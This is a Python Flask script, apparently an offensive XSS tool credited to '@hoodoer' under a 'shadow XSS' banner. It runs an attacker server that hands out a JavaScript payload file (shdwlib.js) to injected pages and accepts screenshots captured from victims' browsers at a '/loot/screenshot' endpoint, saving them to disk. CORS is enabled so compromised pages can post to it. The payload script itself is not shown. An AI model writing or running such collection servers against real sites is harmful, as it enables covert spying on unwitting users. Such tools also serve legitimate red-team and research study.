#!usr/bin/env python
from flask import Flask, jsonify, abort, make_response, g, request, render_template
from flask_cors import CORS
from enum import Enum
import json


app = Flask(__name__)
CORS(app)


def printHeader():
    print("""
                          .▄▄ ·  ▄ .▄ ▄▄▄· ·▄▄▄▄       ▄▄▌ ▐ ▄▌
                          ▐█ ▀. ██▪▐█▐█ ▀█ ██▪ ██▪     ██· █▌▐█
                          ▄▀▀▀█▄██▀▐█▄█▀▀█ ▐█· ▐█▌▄█▀▄ ██▪▐█▐▐▌
                          ▐█▄▪▐███▌▐▀▐█ ▪▐▌██. ██▐█▌.▐▌▐█▌██▐█▌
                           ▀▀▀▀ ▀▀▀ · ▀  ▀ ▀▀▀▀▀• ▀█▄▀▪ ▀▀▀▀ ▀▪                                                                                                                    
                                                             ,/,@ ...          
              ....,,*,.                                 .&@( .@&%.   @         
               ,@@/ ,#@@@@@&*    .*(%@@@@%/.        %@@@@#         &*          
                   .&@@#.    /&@@@@@%,          ./%@@@@@@@@@@.   &(            
                        .@@@@@/      ,&@@@@@(          *@@@@@@@@&              
                              %@@@@@@@@/    .&@@@@@*       %@@@.               
                            ,@@@@@@@@@(&@.,(%%%#.  /&@@@@#.   &@(              
                           &@@@@@@ *@@@@@@@% ,@,   (      /@@@@( /@@.          
                          @@@@@@@@@@@@@@@@ /#           *#      *&@@@@@/       
                       .@@@,   .@@@@@@@@@/        ,(/   @@@@@&/      .@@@@%    
                    /@@@,     ,@@@@@&,    /,  (.#&%/.*(@@@@@*@@@@@@@@%,   &@@, 
                 %@@@,                         ..*#@@@@@/     (@@#   ./&@@@@@@@
              &@@@.                     *&@@@@@@@#@@@           @@@           
          .@@@&               ./%@@@@@@&/.        @@@            #@@,          
       ,@@@%        *#&@@@@@@@(.                  @@@             *@@(         
    *@@@/,(&@@@@@@@&(.                            @@@              .@@%       
 ,@@@@@@@%*.                                      @@#               *@@%       
                                                 &@@.                &@@.      
                                                #@@/                  @@@      
                                               @@@,                   *@@(     
                                             &@@%                      &@@,    
                                          ,@@@(                         @@@                                                               
                                     ▐▄• ▄ .▄▄ · .▄▄ · 
                                      █▌█▌▪▐█ ▀. ▐█ ▀. 
                                      ·██· ▄▀▀▀█▄▄▀▀▀█▄
                                     ▪▐█·█▌▐█▄▪▐█▐█▄▪▐█
                                     •▀▀ ▀▀ ▀▀▀▀  ▀▀▀▀ 

                                       by @hoodoer
        """)



#***************************************************************************
# Support Functions



#***************************************************************************
# API Endpoints

# Send a copy of the payload
@app.route('/lib/shdwlib.js', methods=['GET'])
def sendPayload():
    with open('./shdwlib.js', 'rb') as file:
        return file.read(), 200



# Capture screenshot
@app.route('/loot/screenshot', methods=['POST'])
def recordScreenshot():
    image = request.data
    #console.log("Received image size: " + str(len(image)))
    #print("Received image: " + str(image))

    # write the file
    # Ok, this is writing out base64 string of data string. 
    # Needs conversion
    print("Writing the file to disk...")
    with open ("./lootScreenshot.png", "wb") as binary_file:
        binary_file.write(image)
        binary_file.close()

    return "ok", 200



if __name__ == '__main__':
    printHeader()
    app.run(debug=False, host='0.0.0.0', port=8444)